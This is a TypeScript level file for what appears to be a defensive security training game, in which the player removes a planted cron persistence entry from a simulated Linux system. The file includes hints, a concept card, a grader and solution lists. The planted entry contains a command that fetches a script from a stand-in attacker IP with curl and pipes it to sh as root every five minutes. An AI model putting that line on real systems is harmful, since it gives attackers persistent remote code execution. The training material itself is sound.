import { at, baseFiles, baseProcs, DAY, dir, file, text } from './builders';
import type { FileSpec, Level } from './types';
import type { GameState } from '../shell/state';
import type { VNode } from '../vfs/vfs';

const NOW = at('2026-11-20T09:00:00Z');
const OLD = { mtime: NOW - 100 * DAY };
const C2 = '203.0.113.66';
const PLANTED = '/etc/cron.d/system-update';

const legit: FileSpec[] = [
  file('/etc/crontab', text(`
    # /etc/crontab: system-wide crontab
    SHELL=/bin/sh
    PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

    # m h dom mon dow user  command
    17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
    25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
    47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
  `), OLD),
  file('/etc/cron.d/backup-db', '# nightly database backup\n30 2 * * * root /usr/local/bin/backup.sh\n', OLD),
  file('/etc/cron.d/php', '# clean up expired PHP sessions\n09,39 * * * * root [ -x /usr/lib/php/sessionclean ] && /usr/lib/php/sessionclean\n', OLD),
  file('/etc/cron.d/sysstat', '# activity reports every 10 minutes\n5-55/10 * * * * root command -v debian-sa1 > /dev/null && debian-sa1 1 1\n', OLD),
  file('/etc/cron.d/certbot', '# renew TLS certificates twice a day\n0 */12 * * * root certbot -q renew\n', { mtime: NOW - 40 * DAY }),
  file('/etc/cron.daily/logrotate', '#!/bin/sh\n/usr/sbin/logrotate /etc/logrotate.conf\n', { ...OLD, mode: 0o755 }),
  file('/etc/cron.daily/man-db', '#!/bin/sh\nmandb --quiet\n', { ...OLD, mode: 0o755 }),
  file('/var/spool/cron/crontabs/analyst', '# m h dom mon dow command\n0 9 * * 1 /home/analyst/bin/weekly-report.sh\n', { owner: 'analyst', group: 'analyst', mode: 0o600, mtime: NOW - 30 * DAY }),
];

const walk = (node: VNode | undefined, fn: (content: string) => void): void => {
  if (!node) return;
  if (node.type === 'file') fn(node.content);
  else node.children.forEach((c) => walk(c, fn));
};
const CRON_PATHS = ['/etc/crontab', '/etc/cron.d', '/etc/cron.daily', '/etc/cron.hourly', '/etc/cron.weekly', '/var/spool/cron'];
function persistenceRemains(s: GameState): boolean {
  let found = false;
  for (const p of CRON_PATHS) walk(s.vfs.tryGet(p), (c) => { if (c.includes(C2)) found = true; });
  return found;
}

export const cronPersistence: Level = {
  id: 'cron-persistence',
  module: 'linux',
  title: 'It Keeps Coming Back',
  story: text(`
    The backdoor you killed keeps restarting. Something relaunches it on a timer.
    cron reads /etc/crontab, /etc/cron.d/, /etc/cron.daily/ and /var/spool/cron/crontabs/.
    One entry does not belong.
  `),
  objective: 'Remove the malicious cron entry. Leave the legitimate jobs untouched.',
  now: NOW,
  initialFS: [
    ...baseFiles(NOW),
    dir('/etc/cron.d', OLD), dir('/etc/cron.daily', OLD), dir('/etc/cron.hourly', OLD), dir('/etc/cron.weekly', OLD),
    dir('/var/spool/cron/crontabs', { mode: 0o1730, ...OLD }),
    ...legit,
    file(PLANTED, `# system maintenance\n*/5 * * * * root curl -fsS http://${C2}/u.sh | sh >/dev/null 2>&1\n`, { mtime: at('2026-11-18T03:21:00Z') }),
    dir('/etc/cron.d', { mtime: at('2026-11-18T03:21:00Z') }),
  ],
  initialProcesses: baseProcs(),
  goalCheck: (s) => !persistenceRemains(s),
  failCheck: (s) => {
    const broken = legit.find((f) => s.vfs.tryGet(f.path)?.type !== 'file' || s.vfs.readFile(f.path) !== f.content);
    return broken ? `You removed or changed ${broken.path}, a legitimate scheduled job.` : null;
  },
  hints: [
    'For each cron entry, check what it runs and when its file last changed (`ls -l`).',
    'By content: `grep -r curl /etc/cron.d /etc/crontab`. By time: `ls -lt /etc/cron.d` or `find /etc -type f -mtime -3`.',
    'The planted file is root-owned: `sudo rm /etc/cron.d/system-update`.',
  ],
  conceptCard: {
    attack: [
      'A cron entry periodically downloads and runs attacker code as root.',
      'Killing the process or deleting its file achieves nothing: the timer reinstalls it.',
    ],
    detection: [
      'Review /etc/crontab, /etc/cron.d, /etc/cron.{hourly,daily,weekly} and /var/spool/cron/crontabs.',
      'Red flags: curl or wget piped to a shell, paths in /tmp, very frequent schedules.',
      'Recent mtimes narrow the search (ls -lt, find -mtime), though they can be forged.',
    ],
    mitigation: [
      'Remove the entry and keep a copy as evidence.',
      'Check systemd timers, shell profiles and authorized_keys too.',
      'Monitor cron directories and restrict outbound traffic from servers.',
    ],
    commands: [
      { cmd: 'grep -r curl /etc/cron.d /etc/crontab', explain: 'search every cron file for a telltale command' },
      { cmd: 'ls -lt /etc/cron.d', explain: 'newest first: a recent file stands out among months-old ones' },
      { cmd: 'find /etc -type f -mtime -3', explain: 'files under /etc modified in the last three days' },
      { cmd: 'sudo rm /etc/cron.d/system-update', explain: 'cron files are root-owned, so removal needs sudo' },
    ],
  },
  intel: 'cron is clean. One odd process remains: /opt/telemetry/agent.',
  idealSolution: ['grep -r curl /etc/cron.d /etc/crontab', `sudo rm ${PLANTED}`],
  altSolutions: [
    ['ls -lt /etc/cron.d', `cat ${PLANTED}`, 'sudo mkdir /root/quarantine', `sudo mv ${PLANTED} /root/quarantine/`],
    ['find /etc -type f -mtime -3', `sudo rm -f ${PLANTED}`],
    ['cd /etc/cron.d', 'grep -l "| sh" *', 'sudo rm system-update'],
  ],
  wrongSolutions: [
    [`rm ${PLANTED}`], // not root
    [`sudo chmod 000 ${PLANTED}`], // cron runs as root and still reads it
    ['sudo rm -r /etc/cron.d'], // destroys the legitimate jobs too
    [`sudo rm ${PLANTED} /etc/cron.d/certbot`],
    [`sudo cp ${PLANTED} /etc/cron.daily/update`, `sudo rm ${PLANTED}`], // moved, still scheduled
  ],
};
